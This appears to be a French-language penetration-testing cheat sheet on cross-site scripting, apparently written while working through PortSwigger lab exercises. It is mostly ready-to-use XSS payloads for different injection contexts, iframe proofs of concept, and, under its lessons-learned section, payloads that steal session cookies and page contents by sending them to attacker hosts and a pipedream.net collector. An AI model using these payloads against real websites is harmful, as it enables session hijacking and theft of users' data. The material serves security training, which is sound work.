# XSS

## Ressources 

* [SecList](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
* [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


## Basics 

## complément XSS

Trois cas d’usage où une faille XSS peut être identifiée :
Le paramètre est repris au milieu d’une balise HTML, il est alors nécessaire d’avoir les chevrons non encodés afin d’exploiter cette faille

```html
<script>alert(0)</script>
```

Le paramètre est repris au milieu d’un paramètre d’une balise HTML, il est alors nécessaire d’avoir les guillemets non encodés afin d’exploiter cette faille

```js
onready="alert(0)
```

Le paramètre est repris au sein d’une balise script, il est alors nécessaire d’avoir l’un de ces caractères selon le contexte : ', "  ou ;

```js
'; alert(0); //
```

# types

## Reflected + Stored

```html
<script>alert(0)</script>
<img src=1 onerror=alert(1)>
<a href="javascript:alert(document.domain)">Click Me</a>
```

parfois il faut jouer avec les "quotes":

```js
"onmouseover="alert(0)'
```

exécutera : 

```js
name=search value=""onmouseover="alert(0)">
```

Quand la saisie réapparait dans un href, on insert directement le code JS:

```js
javascript:alert(document.domain)
```

Si la saisie réapparait dans du code JS, on ferme la quote ' et utilise le signe moins - ou + pour concat:

```js
'+alert(document.cookie)+'
```

## DOM

```html
"><script>alert(document.domain)</script>
"><img src=1 onerror=alert(document.domain)>
```

### jQuery + manipulation url


```js
?returnUrl=javascript:alert(document.domain)
```

### AngularJS + ng-app attribute

```js
{{constructor.constructor('alert(1)')()}}
```

### in xhr

```js
\"-alert(1)}//
```

## POC depuis un iframe

```html
<iframe src="https://ace11f3f1fe0965980b4432a00d900b0.web-security-academy.net/?earch=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='1000px'>" onload=this.style.width='1000px'>
```

## custom ID (from malicious server)

```html
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## Retour d'expérience

### Success

* Lorsque des caractères sont filtrés: utiliser le fuzzer ZAP, le BURP intruder ou Ffuf pour tester les balises et les payload petit à petit jusqu'a avoir des réponses 200 avec chars non encodés
* regarder dans le débugger du navigateur: "inspect element" et onglet "source" pour contrôler l'échappent.

* Vol de cookie (DOM based) : 

```js
test';document.location="https://attacker.lan?c="+document.cookie;'
```

```html
<script>
fetch('https://attacker.machine', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

* Vol du contenu la page web :

```html
<img src=x onerror="document.location=`//en5048oeg59ha.x.pipedream.net?c=${btoa(document.body.innerHTML)}`">
```

```html
<svg onload='window.location.href="//en5048oeg59ha.x.pipedream.net?content=".concat(document.getElementsByTagName("p")[0].innerHTML.split(" ")[39])'>
```


* marche aussi dans un fichier **.svg**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

### Failed

* Le texte issu d'un `InnerHTML` ou d'autre fonction JS similaire n'est pas (toujours) interprété par le Navigateur. 